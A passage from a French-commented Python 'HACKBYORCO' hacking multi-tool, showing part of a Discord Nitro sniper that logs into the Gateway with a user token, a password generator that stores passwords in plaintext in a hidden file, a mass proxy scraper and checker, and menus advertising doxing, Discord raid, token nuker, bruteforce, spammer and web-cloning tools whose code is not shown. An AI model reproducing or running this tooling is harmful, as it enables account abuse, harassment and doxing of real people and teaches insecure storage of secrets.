                    # On lance l'encaissement dans un thread à part pour ne pas bloquer l'écoute du prochain message
                    threading.Thread(target=redeem_code, args=(code, channel_id, server_id)).start()

    def on_open(ws):
        # Identification à la Gateway Discord
        auth_payload = {
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": "linux",
                    "$browser": "chrome",
                    "$device": "pc"
                }
            }
        }
        ws.send(json.dumps(auth_payload))
        print(f"{G}[*] Sniper connecté. Écoute active sur tous les serveurs...{W}")

    # Lancement du WebSocket
    ws = websocket.WebSocketApp(
        "wss://gateway.discord.gg/?v=9&encoding=json",
        on_open=on_open,
        on_message=on_message
    )
    
    try:
        ws.run_forever()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Sniper arrêté.{W}")

#-------
def password_generator_ultra():
    clear()
    print(f"{P}--- ULTRA-SECURE KEYGEN & MEMORY ---{W}")
    
    try:
        length = int(input(f"{C}Longueur du mot de passe (Recommandé 16+) : {W}"))
        note = input(f"{C}Note/Nom pour ce mot de passe (ex: Facebook, SSH) : {W}")
        
        # Définition des caractères (Puissance maximale : Lettres + Chiffres + Ponctuation)
        alphabet = string.ascii_letters + string.digits + string.punctuation
        
        # Utilisation de secrets (Cryptographically Strong Pseudo-Random Number Generator)
        password = ''.join(secrets.choice(alphabet) for i in range(length))
        
        print(f"\n{G}[GÉNÉRÉ] : {W}{password}")
        
        # --- Système de Mémoire ---
        date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        log_entry = f"[{date}] {note} : {password}\n"
        
        # Sauvegarde dans un fichier caché sur ton Termux
        with open(".password_vault.txt", "a") as f:
            f.write(log_entry)
            
        print(f"{Y}[*] Sauvegardé dans la mémoire (.password_vault.txt){W}")
        
    except ValueError:
        print(f"{R}Erreur : Entre un nombre valide.{W}")
        
    input(f"\n{G}Appuyez sur Entrée...{W}")

def view_password_memory():
    clear()
    print(f"{P}--- PASSWORD MEMORY VAULT ---{W}")
    if os.path.exists(".password_vault.txt"):
        with open(".password_vault.txt", "r") as f:
            print(f"{W}{f.read()}")
    else:
        print(f"{R}Aucun mot de passe en mémoire.{W}")
    input(f"\n{G}Retour...{W}")
#-----19--------


import requests
import threading
from concurrent.futures import ThreadPoolExecutor

def check_proxy_worker(proxy, filename):
    """Vérifie la qualité du proxy et l'écrit si valide."""
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        # Test sur Google avec un timeout de 2s (un proxy plus lent est inutile)
        r = requests.get("https://www.google.com", proxies=proxies, timeout=2)
        if r.status_code == 200:
            with open(filename, "a") as f:
                f.write(proxy + "\n")
            return True
    except:
        return False

def proxy_hunter_massive():
    os.system('clear')
    banner()
    print(f"{BR}--- MASSIVE PROXY HUNTER PRO ---{W}")
    
    filename = "proxy_list.txt"
    # On vide le fichier pour une liste 100% fraîche
    open(filename, "w").close()

    # Sources massives (API & Raw GitHub)
    sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
    ]

    all_raw_proxies = []

    print(f"{Y}[*] Collecte massive en cours...{W}")
    for url in sources:
        try:
            res = requests.get(url, timeout=8)
            if res.status_code == 200:
                p_list = res.text.splitlines()
                all_raw_proxies.extend(p_list)
        except:
            continue

    # Nettoyage : Format unique IP:PORT et suppression des doublons
    clean_proxies = list(set([p.strip() for p in all_raw_proxies if ":" in p]))
    total = len(clean_proxies)
    
    print(f"{G}[+]{W} {total} proxies uniques récupérés.")
    print(f"{Y}[*] Lancement du test de validité (100 Workers)...{W}\n")

    valid_count = 0
    # Utilisation du Pool de Threads pour une vitesse maximale
    with ThreadPoolExecutor(max_workers=100) as executor:
        # On lance tous les checks
        future_to_proxy = {executor.submit(check_proxy_worker, p, filename): p for p in clean_proxies}
        
        for future in future_to_proxy:
            if future.result():
                valid_count += 1
                print(f"{G}[VALIDE]{W} {future_to_proxy[future]} | Total: {valid_count}", end="\r")

    print(f"\n\n{G}[TERMINÉ]{W} {valid_count} proxies valides enregistrés dans {filename}")
    input(f"\n{C}Appuyez sur Entrée pour revenir au menu...{W}")








#--------------------------

# --- Configuration Couleurs HACKBYORCO ---
R = '\033[31m'    # Rouge
BR = '\033[1;31m' # Rouge Vif
W = '\033[0m'     # Blanc / Reset
Y = '\033[33m'    # Jaune
REDB = '\033[41m' # Fond Rouge

def banner():
    # En-tête massif HACKBYORCO
    print(f"""{BR}
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗██████╗ ██╗   ██╗ ██████╗ ██████╗  ██████╗ ██████╗ 
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔══██╗╚██╗ ██╔╝██╔═══██╗██╔══██╗██╔════╝██╔═══██╗
 ███████║███████║██║     █████╔╝ ██████╔╝ ╚████╔╝ ██║   ██║██████╔╝██║     ██║   ██║
 ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══██╗  ╚██╔╝  ██║   ██║██╔══██╗██║     ██║   ██║
 ██║  ██║██║  ██║╚██████╗██║  ██╗██████╔╝   ██║   ╚██████╔╝██║  ██║╚██████╗╚██████╔╝
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═════╝
{W}             {REDB} EDITION MULTI-TOOL V3 | BY ORCO | HACKBYORCO {W}
    """)

def menu_page_1():
    os.system('clear')
    banner()
    print(f"{BR}╔════════════════════════════════════════════════════════════════════════╗{W}")
    print(f"{BR}║{W} {R}[ OSINT & TRACKING ]{W}             {R}[ DISCORD OFFENSIVE ]{W}               {BR}║{W}")
    print(f"{BR}║{W}  {BR}01{W} > IP Lookup Pro           {BR}10{W} > Raid Tool Violent               {BR}║{W}")
    print(f"{BR}║{W}  {BR}02{W} > Username Tracker Pro    {BR}11{W} > Token Info Pro                  {BR}║{W}")
    print(f"{BR}║{W}  {BR}03{W} > Phone Lookup Pro        {BR}12{W} > Token Nuker Pro                 {BR}║{W}")
    print(f"{BR}║{W}  {BR}04{W} > Email Lookup Pro        {BR}13{W} > Token Joiner Pro                {BR}║{W}")
    print(f"{BR}║{W}  {BR}05{W} > Email Lookup Elite      {BR}14{W} > Token Bruteforce Pro            {BR}║{W}")
    print(f"{BR}║{W}  {BR}06{W} > Dox Tracker Pro         {BR}15{W} > Token Spammer Pro               {BR}║{W}")
    print(f"{BR}║{W}  {BR}07{W} > Dox Create Pro          {BR}16{W} > Token Generator Pro             {BR}║{W}")
    print(f"{BR}║{W}  {BR}08{W} > Identity Tracker Pro    {BR}17{W} > Server Info Pro                 {BR}║{W}")
    print(f"{BR}║{W}  {BR}09{W} > Email Tracker Pro       {BR}18{W} > Nitro Generator Pro             {BR}║{W}")
    print(f"{BR}╠════════════════════════════════════════════════════════════════════════╣{W}")
    print(f"{BR}║{W}  {Y}[N]{W} Page Suivante | {Y}[Q]{W} Quitter                                    {BR}║{W}")
    print(f"{BR}╚════════════════════════════════════════════════════════════════════════╝{W}")

def menu_page_2():
    os.system('clear')
    banner()
    print(f"{BR}╔════════════════════════════════════════════════════════════════════════╗{W}")
    print(f"{BR}║{W} {R}[ WEB SCANNER ]{W}                {R}[ NETWORK & PENTEST ]{W}               {BR}║{W}")
    print(f"{BR}║{W}  {BR}19{W} > Website Scanner Pro     {BR}27{W} > IP Port Scanner Elite           {BR}║{W}")
    print(f"{BR}║{W}  {BR}20{W} > URL Scanner Pro         {BR}28{W} > IP Scanner Pro                  {BR}║{W}")
    print(f"{BR}║{W}  {BR}21{W} > SQL Vuln Scanner Pro    {BR}29{W} > IP Generator Pro                {BR}║{W}")
    print(f"{BR}║{W}  {BR}22{W} > Web Cloner Pro          {BR}30{W} > Dark Web Links Pro              {BR}║{W}")
    print(f"{BR}║{W}                             {BR}                                          ║{W}")
    print(f"{BR}║{W} {R}[ SECURITY & DATABASE ]{W}        {R}[ TOOLS & OTHERS ]{W}                  {BR}║{W}")
    print(f"{BR}║{W}  {BR}23{W} > Checker() Ultimate      {BR}31{W} > Password Decrypter              {BR}║{W}")
    print(f"{BR}║{W}  {BR}24{W} > Search Database         {BR}32{W} > Password Encrypted              {BR}║{W}")
    print(f"{BR}║{W}  {BR}25{W} > Password Gen Ultra      {BR}33{W} > Proxy Hunter Massive            {BR}║{W}")
    print(f"{BR}║{W}  {BR}26{W} > View Vault Memory       {BR}34{W} > Nitro Sniper Ultra              {BR}║{W}")
    print(f"{BR}╠════════════════════════════════════════════════════════════════════════╣{W}")
    print(f"{BR}║{W}  {Y}[B]{W} Page Précédente | {Y}[Q]{W} Quitter                                   {BR}║{W}")
    print(f"{BR}╚════════════════════════════════════════════════════════════════════════╝{W}")

def main():
    page = 1
    while True:
        if page == 1:
            menu_page_1()
        else:
            menu_page_2()
        
        choix = input(f"\n{BR}HACKBYORCO {W}@{BR} V3 {W}> {BR}").lower().strip()
        print(W, end="") # Reset couleur immédiat

        # Navigation
        if choix == 'n' and page == 1:
            page = 2
            continue
        elif choix == 'b' and page == 2:
            page = 1
            continue
        elif choix == 'q':
            os.system('clear')
            print(f"{BR}[!] HACKBYORCO Déconnecté.{W}")
            break

        # Logique Page 1
        elif page == 1:
            if choix == '01': ip_lookup_pro()
            elif choix == '02': username_tracker_pro()
            elif choix == '03': phone_lookup_pro()
            elif choix == '04': email_lookup_pro()
            elif choix == '05': email_lookup_elite()
            elif choix == '06': dox_tracker_pro()
            elif choix == '07': dox_create_pro()
            elif choix == '08': identity_tracker_pro()
            elif choix == '09': email_tracker_pro()
            elif choix == '10': raid_tool_violent()
            elif choix == '11': token_info_pro()
            elif choix == '12': token_nuker_pro()
            elif choix == '13': token_joiner_pro()
            elif choix == '14': token_bruteforce_pro()
            elif choix == '15': token_spammer_pro()
            elif choix == '16': token_generator_pro()
            elif choix == '17': server_info_pro()
            elif choix == '18': nitro_generator_pro()

        # Logique Page 2
        elif page == 2:
            if choix == '19': website_scanner_pro()
            elif choix == '20': url_scanner_pro()
            elif choix == '21': sql_vuln_scanner_pro()
            elif choix == '22': web_cloner_pro()
            elif choix == '23': checker()
            elif choix == '24': search_database()
            elif choix == '25': password_generator_ultra()
            elif choix == '26': view_password_memory()
            elif choix == '27': ip_port_scanner_elite()
            elif choix == '28': ip_scanner_pro()
            elif choix == '29': ip_generator_pro()
            elif choix == '30': dark_web_links_pro()
            elif choix == '31': password_decrypter()
            elif choix == '32': password_encrypted()
            elif choix == '33': proxy_hunter_massive()
            elif choix == '34': nitro_sniper_ultra_violent()

# Exécution
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()

